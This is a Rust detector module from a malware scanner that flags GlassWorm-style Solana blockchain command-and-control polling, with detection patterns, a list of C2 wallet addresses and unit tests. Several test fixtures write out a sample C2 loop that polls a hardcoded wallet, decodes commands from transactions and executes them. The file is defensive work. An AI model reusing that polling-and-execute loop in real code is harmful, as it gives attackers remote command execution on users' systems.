//! Blockchain Polling Detector (GlassWorm-specific)
//!
//! Detects GlassWorm-specific blockchain C2 polling patterns,
//! specifically Solana-based command-and-control communication.
//!
//! ## Detection Logic
//!
//! This detector emits findings when:
//! 1. getSignaturesForAddress + setInterval combination (CRITICAL - GlassWorm signature)
//! 2. Solana RPC endpoints with polling
//! 3. Transaction metadata parsing for C2 commands
//! 4. Memo instruction usage for data hiding
//!
//! ## GlassWorm C2 Mechanism
//!
//! GlassWorm uses Solana blockchain for decentralized C2:
//! 1. Poll C2 wallet every 5 minutes using getSignaturesForAddress
//! 2. Fetch transaction details with getTransaction
//! 3. Extract commands from transaction metadata/memo instructions
//! 4. Execute commands received via blockchain
//!
//! This provides resilience - no single point of failure.
//!
//! ## Severity
//!
//! Critical: getSignaturesForAddress + setInterval combination
//! Critical: Known GlassWorm C2 wallet addresses
//! High: Solana RPC endpoint + polling
//! Medium: Memo instruction usage alone

use crate::detector::{Detector, DetectorMetadata, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use once_cell::sync::Lazy;
use regex::Regex;

/// Known GlassWorm C2 wallet addresses (from intelligence reports)
const KNOWN_C2_WALLETS: &[&str] = &[
    // GlassWorm Core
    "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",  // ForceMemo C2
    "28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2",  // Primary GlassWorm
    // ForceMemo
    "G2YxRa6wt1qePMwfJzdXZG62ej4qaTC7YURzuh2Lwd3t",  // ForceMemo funding
    // Chrome RAT (Mar 2026 reports)
    "DSRUBTziADDHSik7WQvSMjvwCHFsbsThrbbjWMoJPUiW",  // Chrome extension RAT C2
    "6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ",  // Payload delivery
];

/// Solana RPC endpoints used by GlassWorm
const SOLANA_RPC_ENDPOINTS: &[&str] = &[
    "api.mainnet-beta.solana.com",
    "solana-api.projectserum.com",
    "rpc.ankr.com/solana",
    "api.devnet.solana.com",
    "api.testnet.solana.com",
];

/// Check for GlassWorm-specific C2 patterns
/// UPDATED 2026-03-26: Only flag specific C2 patterns, not generic SDK usage
fn has_glassworm_c2_patterns(content: &str) -> bool {
    let glassworm_patterns = [
        // Pattern 1: Command extraction from tx metadata (specific to C2)
        "decodeCommand",
        "executeCommand",

        // Pattern 2: Polling with hardcoded C2 wallet (not user wallet)
        "getSignaturesForAddress(C2_WALLET",
        "getSignaturesForAddress(new PublicKey(\"",
    ];

    // Must have one of the specific C2 patterns
    // Do NOT flag generic SDK patterns like:
    // - innerInstructions (used by all Solana apps)
    // - new PublicKey(" (used everywhere)
    // - executeCommand alone (common in many contexts)
    glassworm_patterns.iter().any(|p| content.contains(p))
}

/// Check for legitimate SDK usage patterns
fn has_legitimate_sdk_usage(content: &str) -> bool {
    let legitimate_patterns = [
        // User wallet from environment
        "process.env.SOLANA_WALLET",
        "process.env.PUBLIC_KEY",
        "process.env.RPC_URL",

        // User wallet from props/state
        "props.wallet",
        "wallet.address",
        "wallet.publicKey",

        // Wallet hooks (React)
        "useWallet(",
        "useAnchorWallet",
        "useConnection",

        // Standard SDK methods
        "connection.getAccountInfo",
        "connection.getBalance",
        "connection.getParsedAccountInfo",
    ];

    legitimate_patterns.iter().any(|p| content.contains(p))
}

/// Check if this looks like SDK source code (should be skipped)
/// UPDATED 2026-03-26: SDK files contain function definitions, exports, class declarations
fn is_sdk_source_code(content: &str) -> bool {
    let sdk_patterns = [
        // Function definitions (SDK method implementations)
        "async getSignaturesForAddress(",
        "async getTransaction(",
        "async getBalance(",
        "function getSignaturesForAddress(",
        "function getTransaction(",
        
        // Class declarations
        "class Connection",
        "class PublicKey",
        "class Transaction",
        
        // Export patterns
        "export class",
        "export function",
        "export {",
        "module.exports",
        "exports.",
        
        // Constructor patterns
        "constructor(rpcUrl",
        "constructor(props",
        
        // TypeScript/JavaScript SDK patterns
        "implements ConnectionInterface",
        "extends EventEmitter",
    ];

    sdk_patterns.iter().any(|p| content.contains(p))
}

/// Patterns for blockchain polling detection
static POLLING_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // getSignaturesForAddress method (GlassWorm primary)
        Regex::new(r"getSignaturesForAddress\s*\(").unwrap(),
        // getTransaction method
        Regex::new(r"getTransaction\s*\(").unwrap(),
        // getParsedTransactions method
        Regex::new(r"getParsedTransactions?\s*\(").unwrap(),
        // setInterval with async callback
        Regex::new(r"setInterval\s*\(\s*async").unwrap(),
        // Connection to Solana RPC
        Regex::new(r"new\s+Connection\s*\(").unwrap(),
        // Memo instruction
        Regex::new(r"Memo(?:Instruction|Program)?").unwrap(),
        // Transaction metadata parsing
        Regex::new(r"tx\.meta(?:innerInstructions)?|transaction\.meta").unwrap(),
        // Inner instructions (GlassWorm command extraction)
        Regex::new(r"innerInstructions").unwrap(),
    ]
});

/// Detector for GlassWorm blockchain polling
pub struct BlockchainPollingDetector;

impl BlockchainPollingDetector {
    /// Create a new blockchain polling detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for BlockchainPollingDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for BlockchainPollingDetector {
    fn name(&self) -> &str {
        "blockchain_polling"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier3Behavioral
    }

    fn cost(&self) -> u8 {
        4  // Medium cost - multiple pattern matching
    }

    fn signal_strength(&self) -> u8 {
        10  // Very high signal - getSignaturesForAddress + interval is GlassWorm signature
    }

    fn prerequisites(&self) -> Vec<&'static str> {
        vec!["invisible_char", "glassware"]  // Run after Tier 1-2
    }

    fn should_run(&self, findings: &[Finding]) -> bool {
        // Don't run Tier 3 if nothing found by Tier 1-2
        !findings.is_empty()
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();
        let content = ir.content();
        let path = &ir.metadata.path;

        // Skip TypeScript definition files (.d.ts) - they contain type definitions, not C2 logic
        if path.ends_with(".d.ts") {
            return findings;
        }

        // UPDATED 2026-03-26: Skip SDK source code files
        // SDK files contain function definitions, class declarations, exports
        // These are NOT C2 code - they're the legitimate blockchain SDK implementation
        if is_sdk_source_code(content) {
            return findings;
        }

        // Check for GlassWorm-specific C2 patterns FIRST (always Critical)
        if has_glassworm_c2_patterns(content) {
            findings.push(Finding::new(
                path,
                1,
                1,
                0,
                '\0',
                DetectionCategory::BlockchainC2,
                Severity::Critical,
                "GlassWorm C2 polling pattern detected",
                "CRITICAL: GlassWorm-specific C2 patterns detected including command extraction, \
                 hidden wallet addresses, or direct C2 wallet polling. \
                 Immediate incident response required.",
            )
            .with_cwe_id("CWE-506")
            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
            .with_confidence(0.92));
            return findings;
        }

        // Track pattern matches for correlation
        let mut has_get_signatures = false;
        let mut has_set_interval = false;
        let mut has_solana_rpc = false;
        let mut has_transaction_parsing = false;
        let mut has_memo = false;
        let mut matched_wallets: Vec<&str> = Vec::new();
        let mut first_match_line = 1;

        // Track memo findings to avoid flooding (limit to first 3 per file)
        let mut memo_findings = 0;
        const MAX_MEMO_FINDINGS: usize = 3;

        for (line_num, line) in content.lines().enumerate() {
            let line = line.trim();

            // Check for known C2 wallet addresses (ALWAYS flag)
            for wallet in KNOWN_C2_WALLETS {
                if line.contains(wallet) {
                    matched_wallets.push(wallet);
                    if first_match_line == 1 {
                        first_match_line = line_num + 1;
                    }

                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::BlockchainC2,
                            Severity::Critical,
                            &format!("Known GlassWorm C2 wallet address: {}", wallet),
                            "CRITICAL: Confirmed GlassWorm command-and-control wallet. \
                             This is a definitive indicator of GlassWorm infection. \
                             Immediate incident response required.",
                        )
                        .with_cwe_id("CWE-506")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.98),
                    );
                }
            }

            // Track pattern matches
            if POLLING_PATTERNS[0].is_match(line) {
                has_get_signatures = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }
            }

            if POLLING_PATTERNS[3].is_match(line) {
                has_set_interval = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }
            }

            // Check for Solana RPC endpoints
            for endpoint in SOLANA_RPC_ENDPOINTS {
                if line.contains(endpoint) {
                    has_solana_rpc = true;
                    if first_match_line == 1 {
                        first_match_line = line_num + 1;
                    }

                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::BlockchainC2,
                            Severity::High,
                            &format!("Solana RPC endpoint: {}", endpoint),
                            "Solana RPC endpoint detected. When combined with polling patterns, \
                             this indicates blockchain-based C2 communication.",
                        )
                        .with_cwe_id("CWE-506")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.75),
                    );
                }
            }

            // Check for transaction metadata parsing
            // UPDATED 2026-03-26: Only flag when combined with suspicious patterns
            // innerInstructions and tx.meta are used by all Solana apps legitimately
            // Only flag when combined with decodeCommand/executeCommand
            if (POLLING_PATTERNS[1].is_match(line) || POLLING_PATTERNS[6].is_match(line) || POLLING_PATTERNS[7].is_match(line))
                && (content.contains("decodeCommand") || content.contains("executeCommand")) {
                has_transaction_parsing = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }

                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::High,
                        "Transaction metadata parsing for C2 commands",
                        "GlassWorm extracts commands from Solana transaction metadata. \
                         Review the transaction parsing logic for command execution.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.80),
                );
            }

            // Check for memo instruction usage (LIMITED to avoid flooding)
            if POLLING_PATTERNS[5].is_match(line) && memo_findings < MAX_MEMO_FINDINGS {
                has_memo = true;
                memo_findings += 1;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }

                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::Medium,
                        "Memo instruction usage (potential data hiding)",
                        "Solana memo instructions can hide C2 commands or exfiltrated data. \
                         Review memo content for encoded payloads.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.65),
                );
            }
        }

        // Check for 5-minute polling interval (GlassWorm signature - always Critical)
        if content.contains("setInterval") && content.contains("300000") {
            findings.push(Finding::new(
                path,
                first_match_line,
                1,
                0,
                '\0',
                DetectionCategory::BlockchainC2,
                Severity::Critical,
                "5-minute polling interval (GlassWorm C2 signature)",
                "CRITICAL: 5-minute (300000ms) polling interval is a known GlassWorm C2 signature. \
                 This timing pattern is used to poll blockchain for commands while avoiding detection.",
            )
            .with_cwe_id("CWE-506")
            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
            .with_confidence(0.90));
        }

        // Check for getSignaturesForAddress + setInterval combination
        if content.contains("getSignaturesForAddress") && content.contains("setInterval") {
            // Check for legitimate SDK usage - if present, don't flag
            if has_legitimate_sdk_usage(content) || is_sdk_source_code(content) {
                // Likely legitimate SDK usage - return early without flagging
                return findings;
            }

            // Generic polling without GlassWorm patterns or legitimate context = MEDIUM
            findings.push(Finding::new(
                path,
                first_match_line,
                1,
                0,
                '\0',
                DetectionCategory::BlockchainC2,
                Severity::Medium,
                "Blockchain polling detected - review for C2 usage",
                "Generic blockchain polling pattern detected. Without GlassWorm-specific patterns \
                 or legitimate SDK context, this requires manual review to determine if malicious.",
            )
            .with_cwe_id("CWE-506")
            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
            .with_confidence(0.50));
        }

        // High: Solana RPC + polling (even without getSignaturesForAddress)
        if has_solana_rpc && has_set_interval && !has_get_signatures {
            // Check for legitimate SDK usage
            if has_legitimate_sdk_usage(content) || is_sdk_source_code(content) {
                return findings;
            }

            findings.push(
                Finding::new(
                    path,
                    first_match_line,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "Solana RPC endpoint with polling interval",
                    "Combination of Solana RPC usage and polling suggests blockchain C2. \
                     Review the polling logic for command extraction.",
                )
                .with_cwe_id("CWE-506")
                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                .with_confidence(0.82),
            );
        }

        // Correlation: transaction parsing + memo = command extraction
        if has_transaction_parsing && has_memo {
            findings.push(
                Finding::new(
                    path,
                    first_match_line,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "Transaction parsing + memo instruction (command extraction pattern)",
                    "GlassWorm extracts commands from transaction memo instructions. \
                     This pattern indicates active C2 communication.",
                )
                .with_cwe_id("CWE-506")
                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                .with_confidence(0.85),
            );
        }

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "blockchain_polling".to_string(),
            version: "1.0.0".to_string(),
            description: "Detects GlassWorm blockchain C2 polling patterns including Solana RPC usage and transaction parsing".to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn test_detect_glassworm_signature() {
        let detector = BlockchainPollingDetector::new();

        // GlassWorm signature: getSignaturesForAddress + setInterval + 5-minute polling
        let content = r#"
            const { Connection, PublicKey } = require('@solana/web3.js');

            const C2_WALLET = new PublicKey("7nE9GdcnPSzC9X5K9K4...");
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            // Poll every 5 minutes
            setInterval(async () => {
                const signatures = await connection.getSignaturesForAddress(C2_WALLET, { limit: 1 });
                if (signatures.length > 0) {
                    const tx = await connection.getTransaction(signatures[0].signature);
                    const command = decodeCommand(tx.meta.innerInstructions);
                    executeCommand(command);
                }
            }, 300000);
        "#;

        let ir = FileIR::build(Path::new("c2.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        // Should have Critical finding for GlassWorm C2 patterns (innerInstructions, decodeCommand, etc.)
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
    }

    #[test]
    fn test_detect_known_wallet() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const C2_ADDRESS = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";
            const memo = await getLatestMemo(C2_ADDRESS);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].description.contains("Known GlassWorm C2 wallet"));
        assert!(findings[0].confidence.unwrap_or(0.0) >= 0.95);
    }

    #[test]
    fn test_detect_solana_rpc_polling() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const connection = new Connection("https://api.mainnet-beta.solana.com");
            
            setInterval(async () => {{
                const balance = await connection.getBalance(wallet);
                console.log('Balance:', balance);
            }}, 5000);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn test_detect_transaction_parsing() {
        let detector = BlockchainPollingDetector::new();

        // Transaction metadata parsing - innerInstructions alone is NOT GlassWorm C2
        // It's used by all Solana applications legitimately
        let content = r#"
            const tx = await connection.getTransaction(signature);
            const instructions = tx.meta.innerInstructions;
            const memo = instructions.find(i => i.programId.equals(MEMO_PROGRAM_ID));
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // innerInstructions alone should NOT trigger GlassWorm C2 pattern
        // It's a standard Solana SDK pattern used by all apps
        assert!(findings.is_empty(), "Expected no findings for innerInstructions alone, got: {:?}", findings);
    }

    #[test]
    fn test_detect_memo_instruction() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const {{ MemoProgram }} = require('@solana/web3.js');
            const memoInstruction = MemoProgram.createInstruction('Hello World');
            transaction.add(memoInstruction);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("Memo instruction")));
    }

    #[test]
    fn test_no_detect_legitimate_blockchain() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate blockchain usage without polling
        let content = r#"
            const {{ Connection }} = require('@solana/web3.js');
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            // One-time balance check
            async function checkBalance() {{
                const balance = await connection.getBalance(wallet);
                return balance;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should have minimal findings (just RPC endpoint, no Critical)
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_no_detect_legitimate_sdk_with_polling() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate SDK usage with polling - should NOT be flagged
        let content = r#"
            import {{ useWallet, useConnection }} from '@solana/wallet-adapter-react';

            function WalletComponent() {{
                const {{ connection }} = useConnection();
                const {{ wallet }} = useWallet();

                // Poll wallet balance using React hooks
                useEffect(() => {{
                    const interval = setInterval(async () => {{
                        if (wallet.publicKey) {{
                            const balance = await connection.getBalance(wallet.publicKey);
                            setBalance(balance);
                        }}
                    }}, 5000);
                    return () => clearInterval(interval);
                }}, [wallet, connection]);

                return <div>Balance: {{balance}}</div>;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag legitimate SDK usage with polling
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(!findings.iter().any(|f| f.severity == Severity::Medium && f.description.contains("Blockchain polling")));
    }

    #[test]
    fn test_no_detect_legitimate_sdk_with_getsignatures() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate SDK usage with getSignaturesForAddress - should NOT be flagged
        let content = r#"
            import {{ useConnection }} from '@solana/wallet-adapter-react';

            function TransactionHistory() {{
                const {{ connection }} = useConnection();
                const walletAddress = props.wallet.address;

                // Fetch transaction history for user wallet
                const fetchTransactions = async () => {{
                    const signatures = await connection.getSignaturesForAddress(
                        walletAddress,
                        {{ limit: 10 }}
                    );
                    return signatures;
                }};

                return <TransactionList transactions={{fetchTransactions()}} />;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag legitimate SDK usage
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(!findings.iter().any(|f| f.severity == Severity::Medium));
    }

    #[test]
    fn test_detect_glassworm_c2_patterns() {
        let detector = BlockchainPollingDetector::new();

        // GlassWorm C2 pattern with innerInstructions and command extraction
        let content = r#"
            const {{ Connection, PublicKey }} = require('@solana/web3.js');

            const C2_WALLET = new PublicKey("7nE9GdcnPSzC9X5K9K4...");
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            setInterval(async () => {{
                const signatures = await connection.getSignaturesForAddress(C2_WALLET, {{ limit: 1 }});
                if (signatures.length > 0) {{
                    const tx = await connection.getTransaction(signatures[0].signature);
                    const command = decodeCommand(tx.meta.innerInstructions);
                    executeCommand(command);
                }}
            }}, 300000);
        "#;

        let ir = FileIR::build(Path::new("c2.js"), content);
        let findings = detector.detect(&ir);

        // Should flag as Critical for GlassWorm C2 patterns
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
    }

    #[test]
    fn test_detect_5minute_polling() {
        let detector = BlockchainPollingDetector::new();

        // 5-minute polling interval (GlassWorm signature)
        let content = r#"
            const {{ Connection }} = require('@solana/web3.js');
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            // Poll every 5 minutes (300000ms)
            setInterval(async () => {{
                const info = await connection.getAccountInfo(someAddress);
                console.log('Account info:', info);
            }}, 300000);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should flag 5-minute polling as Critical
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("5-minute polling")));
    }

    #[test]
    fn test_detect_generic_polling_medium_severity() {
        let detector = BlockchainPollingDetector::new();

        // Generic polling without GlassWorm patterns or legitimate context
        // Note: Using wallet address from variable (not hardcoded) to avoid GlassWorm pattern
        let content = r#"
            const { Connection, PublicKey } = require('@solana/web3.js');

            const walletAddress = getWalletFromConfig();
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            setInterval(async () => {
                const signatures = await connection.getSignaturesForAddress(walletAddress, { limit: 1 });
                console.log('Latest signatures:', signatures);
            }, 10000);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should flag as Medium severity (generic polling, needs review)
        // Not Critical since no GlassWorm patterns (no hardcoded wallet, no innerInstructions, etc.)
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Medium));
        assert!(findings.iter().any(|f| f.description.contains("review for C2")));
        // Should NOT be Critical since no GlassWorm patterns
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_detect_legitimate_env_wallet() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate usage with environment variable wallet
        let content = r#"
            const {{ Connection }} = require('@solana/web3.js');
            const connection = new Connection(process.env.RPC_URL);
            const walletAddress = process.env.SOLANA_WALLET;

            setInterval(async () => {{
                const balance = await connection.getBalance(walletAddress);
                console.log('Balance:', balance);
            }}, 5000);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag legitimate SDK usage with env vars
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(!findings.iter().any(|f| f.severity == Severity::Medium));
    }

    #[test]
    fn test_detect_legitimate_react_hooks() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate React hooks usage
        let content = r#"
            import {{ useAnchorWallet }} from '@solana/wallet-adapter-react';

            function MyComponent() {{
                const wallet = useAnchorWallet();
                const connection = useConnection();

                useEffect(() => {{
                    const checkBalance = async () => {{
                        if (wallet.publicKey) {{
                            const balance = await connection.getAccountInfo(wallet.publicKey);
                            setAccountInfo(balance);
                        }}
                    }};
                    checkBalance();
                }}, [wallet]);

                return <div>{{accountInfo}}</div>;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag legitimate React hooks usage
        assert!(findings.is_empty());
    }

    #[test]
    fn test_glassworm_patterns_override_legitimate() {
        let detector = BlockchainPollingDetector::new();

        // Has some legitimate patterns BUT also has GlassWorm C2 patterns
        let content = r#"
            import {{ useConnection }} from '@solana/wallet-adapter-react';

            function MaliciousComponent() {{
                const {{ connection }} = useConnection();

                setInterval(async () => {{
                    const signatures = await connection.getSignaturesForAddress(new PublicKey("C2_WALLET"));
                    const tx = await connection.getTransaction(signatures[0].signature);
                    const command = decodeCommand(tx.meta.innerInstructions);
                    executeCommand(command);
                }}, 300000);

                return <div>Malicious</div>;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // GlassWorm patterns should ALWAYS be flagged as Critical
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
    }

    #[test]
    fn test_no_detect_sdk_source_code() {
        let detector = BlockchainPollingDetector::new();

        // SDK source code with function definitions - should NOT be flagged
        let content = r#"
            export class Connection {
                constructor(rpcUrl) {
                    this.rpcUrl = rpcUrl;
                }

                async getSignaturesForAddress(address, options) {
                    const response = await fetch(this.rpcUrl, {
                        method: 'POST',
                        body: JSON.stringify({
                            method: 'getSignaturesForAddress',
                            params: [address, options]
                        })
                    });
                    return response.json();
                }

                async getTransaction(signature) {
                    const response = await fetch(this.rpcUrl, {
                        method: 'POST',
                        body: JSON.stringify({
                            method: 'getTransaction',
                            params: [signature]
                        })
                    });
                    return response.json();
                }
            }
        "#;

        let ir = FileIR::build(Path::new("connection.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag SDK source code
        assert!(findings.is_empty(), "Expected no findings for SDK source code, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_sdk_function_definitions() {
        let detector = BlockchainPollingDetector::new();

        // SDK with function definitions - should NOT be flagged
        let content = r#"
            async function getSignaturesForAddress(connection, address, options) {
                return await connection.request({
                    method: 'getSignaturesForAddress',
                    params: [address, options]
                });
            }

            async function getBalance(connection, address) {
                return await connection.request({
                    method: 'getBalance',
                    params: [address]
                });
            }

            module.exports = { getSignaturesForAddress, getBalance };
        "#;

        let ir = FileIR::build(Path::new("utils.js"), content);
        let findings = detector.detect(&ir);

        // Should NOT flag SDK function definitions
        assert!(findings.is_empty(), "Expected no findings for SDK function definitions, got: {:?}", findings);
    }
}
